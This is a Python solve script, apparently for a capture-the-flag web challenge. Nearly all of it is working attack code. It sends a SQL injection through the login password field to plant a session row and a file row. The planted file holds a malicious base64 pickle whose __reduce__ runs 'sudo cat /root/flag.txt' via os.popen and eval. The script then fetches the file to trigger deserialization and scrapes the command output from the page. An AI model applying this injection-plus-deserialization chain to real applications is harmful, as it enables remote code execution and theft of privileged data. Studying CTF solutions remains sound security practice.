import base64
import pickle
import uuid

from requests_toolbelt.sessions import BaseUrlSession

"""
To run through Burp use this in your shell:

export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
"""

# session = BaseUrlSession(base_url='http://localhost:31337')
session = BaseUrlSession(base_url='http://challenge.ctf.games:30354')

# fresh sess_id and filename for each run to avoid unique constraint failures
sess_id = uuid.uuid4()
filename = uuid.uuid4()

PAYLOAD1 = ('test\\;INSERT\nINTO\nactivesessions\nVALUES(\\{sess_id}\\,\\username\\,0);'
            'INSERT\nINTO\nfiles\nVALUES(\\{filename}\\,\\{b64_data}\\,\\{sess_id}\\);SELECT\\')

PREFIX = b'<div class="mt-3 alert alert-danger">\n            '
SUFFIX = b'\n        </div>\n        \n        \n    </div>\n</body>\n</html>'

EVAL_CODE = 'flash(os.popen("sudo cat /root/flag.txt").read())'


class RCE:
    def __reduce__(self):
        # flag is in /root/flag.txt, user moveable can run sudo w/o password
        return __builtins__.eval, (EVAL_CODE,)


def insert_session():
    print(f'encoding EVAL_CODE: {EVAL_CODE}')
    b64_data = base64.b64encode(pickle.dumps(RCE())).decode()
    print('encoded/pickled data:', b64_data)
    data = {'username': '', 'password': PAYLOAD1.format(b64_data=b64_data, sess_id=sess_id, filename=filename)}
    session.post('/login', data=data)


def download_file():
    resp = session.get(f'/download/{filename}/{sess_id}')
    content = resp.content

    # 31337 h4x0r HTML parsing, best ever!
    print()
    if PREFIX in content and SUFFIX in content:
        print('Got PREFIX and SUFFIX, command output:')
        print(content[content.find(PREFIX) + len(PREFIX):content.find(SUFFIX)].decode())
    else:
        print('WARNING! PREFIX NOT FOUND, RAW CONTENT:')
        print(resp.content)


def main():
    print('generated sess_id:', sess_id)
    print('generated filename:', filename)
    insert_session()
    download_file()


if __name__ == '__main__':
    main()
